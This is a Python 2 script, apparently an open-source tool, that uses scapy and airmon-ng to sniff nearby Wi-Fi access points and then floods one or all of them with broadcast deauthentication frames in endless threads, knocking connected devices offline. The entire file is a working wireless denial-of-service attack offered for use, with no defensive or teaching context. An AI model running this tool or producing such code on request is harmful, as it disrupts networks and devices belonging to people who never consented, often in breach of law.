#!/usr/bin/python
"""
Sends deauth packets to a wifi network which results network outage for connected devices.
"""
__author__ ="Veerendra Kakumanu"
__license__ = "Apache 2.0"
__version__ = "2.0"
__maintainer__ = "Veerendra Kakumanu"

import os
import threading
import sys
import re

try:
    import scapy.all
except:
    print "\n'scapy' module not found. Installing..."
    os.system("sudo apt-get install python-scapy -y")
    import scapy.all

class airmon(object):
    def __new__(cls, *args,**kwargs):
        mon_interface=list()
        with open("/proc/net/dev","r") as f:
            for line in f.readlines():
                if re.search(r'mon[0-9]+',line):
                    print "Found airmon-ng interface..",line.split(":")[0].strip()
                    mon_interface.append(line.split(":")[0].strip())
        if not mon_interface:
            print "Starting monitoring interface on the wlan0..."
            if os.system("airmon-ng start wlan0")!=0:
                print "\nairmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
                raise SystemExit() #Instance creation Aborted!
            mon_interface.append("mon0")
        new_instance=object.__new__(cls,*args,**kwargs)
        setattr(new_instance, "mon_interfaces",mon_interface)
        return new_instance #returns the instance, if there is mon0 interface

def spinner():
    while True:
        for cursor in '|/-\\':
            yield cursor

class sniffWifi(object):
    def __new__(cls,*args,**kwargs):
        mon=airmon() #Starting airmon-ng
        return object.__new__(cls,*args,**kwargs) #returns the instance, IF there is mon0 interface

    def __init__(self,pktlimit=2000):
        self.ap_list = dict() #Key--> ssidcount, Value-->[MAC, SSID]
        self.ap_set=set()
        self.pktcount=0
        self.ssidcount=0
        self.pktlimit=pktlimit #Number of beacons should listen
        self.test=spinner()

    def packetHandler(self,pkt):
        self.pktcount+=1
        if pkt.haslayer(scapy.all.Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in self.ap_set:
            self.ssidcount+=1
            self.ap_set.add(pkt.addr2)
            self.ap_list.setdefault(self.ssidcount,[pkt.addr2,pkt.info])

    def stopFilter(self,x): #Stop the Sniffing if packet reachs the count
        sys.stdout.write("\b{}".format(next(self.test)))
        sys.stdout.flush()
        if self.pktcount==self.pktlimit:
            return True
        else:
            return False

    def runSniff(self): #Sniffing Here!
        print "\nSniffing wifi signals, it will take some time. Please wait.....",
        scapy.all.sniff(iface="mon0", prn = self.packetHandler, stop_filter=self.stopFilter)

class Deauth(threading.Thread):
    def __init__(self,mac=None):
        threading.Thread.__init__(self)
        self.mac=mac
        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()

    def run(self):
        while True:
            print self.mac
            scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2)

if __name__=='__main__':
    try:
        input=os.environ["DEAUTH"] #Starting with Environmental variable `export DEAUTH=<MAC>`
        if re.search(r'(?:[0-9a-fA-F]:?){12}',os.environ["DEAUTH"]):
            print "Got the MAC address from environmental variable!"
            mon=airmon()
            Deauth(input).start()
        else:
            print "Incorrect MAC address formate in environmental variable"
            raise ValueError
    except: # Environmental variable was not set or MAC address was not in corrent format
        if len(sys.argv)==1: # No command line argument
            ap=dict()
            sniff=sniffWifi()
            sniff.runSniff()
            while True:
                try:
                    print "\n\n","0".ljust(2," "),"Sends deauth packets to every network which are given below"
                    for id, ssid in sniff.ap_list.iteritems():
                        print str(id).ljust(2," "),ssid[0].ljust(20," "),ssid[1]
                    x=int(raw_input(">>"))
                    if x==0:
                        for id,mac in sniff.ap_list.iteritems():
                            Deauth(mac[0]).start() #Multi Threading Here
                        break
                    elif x in sniff.ap_list:
                        Deauth(sniff.ap_list[x][0]).start()
                        break
                    else:
                        print "Please enter valid option.\n"
                except:
                    print "Please enter valid option.\n"
                    continue

        elif len(sys.argv)==2:
            input=sys.argv[1]
            if input=="all":
                sniff=sniffWifi()
                sniff.runSniff()
                for id,mac in sniff.ap_list.iteritems():
                    Deauth(mac[0]).start() #Multi Threading Here
            elif re.search(r'(?:[0-9a-fA-F]:?){12}',input):
                mon=airmon()
                Deauth(input).start()
            else:
                print "Incorrect MAC address formate!\nUsage: sudo python deauth.py [MAC or all]"
                sys.exit()

        elif len(sys.argv)>2:
            print "Usage: sudo python deauth.py [MAC or all]"
            sys.exit()
